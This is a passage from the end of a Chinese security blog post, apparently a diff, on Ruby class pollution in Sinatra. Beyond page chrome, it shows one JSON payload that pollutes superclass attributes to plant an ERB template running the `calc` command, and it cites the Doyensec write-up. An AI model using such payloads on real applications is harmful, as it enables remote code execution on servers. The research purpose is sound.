+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;class&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;superclass&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;superclass&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;subclasses&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;sample&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;templates&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;hello&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;%= `calc` %&gt;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges · Doyensec’s Blog</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/04/27/d3_2024/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-01-24 13:23:07
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/trick/" title="trick">
+                        #trick
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/security/" title="security">
+                        #security
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E6%9E%90Ruby%E7%B1%BB%E6%B1%A1%E6%9F%93%E5%8F%8A%E5%85%B6%E5%9C%A8Sinatra%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">浅析Ruby类污染及其在Sinatra框架下的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E7%B1%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">Ruby类介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%92%E5%BD%92%E5%90%88%E5%B9%B6"><span class="toc-text">不安全的递归合并</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%BD%93%E5%89%8D%E5%AF%B9%E8%B1%A1"><span class="toc-text">污染当前对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E7%88%B6%E7%B1%BB"><span class="toc-text">污染父类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%85%B6%E4%BB%96%E7%B1%BB"><span class="toc-text">污染其他类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E6%B1%A1%E6%9F%93%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81%E7%9B%AE%E5%BD%95"><span class="toc-text">类污染设置静态目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E6%B1%A1%E6%9F%93%E5%86%99ERB%E6%A8%A1%E6%9D%BF"><span class="toc-text">类污染写ERB模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Ruby%E7%B1%BB%E6%B1%A1%E6%9F%93%E5%8F%8A%E5%85%B6%E5%9C%A8Sinatra%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F12%2F20%2Fruby-class-pollution%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/12/20/ruby-class-pollution/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,d=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=o());for(var e,i=0;i<d.length;i++)0<=(e=(e=d[i]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,a,n,o=d[i];e=function(){d=d.filter(function(t){return o!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(o)},(t=o).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,n=t.getAttribute("data-original"),a.onload=function(){t.src=n,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=n},t.src!==n&&(a.src=n)))}()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)}(this);</script></body>
+</html>
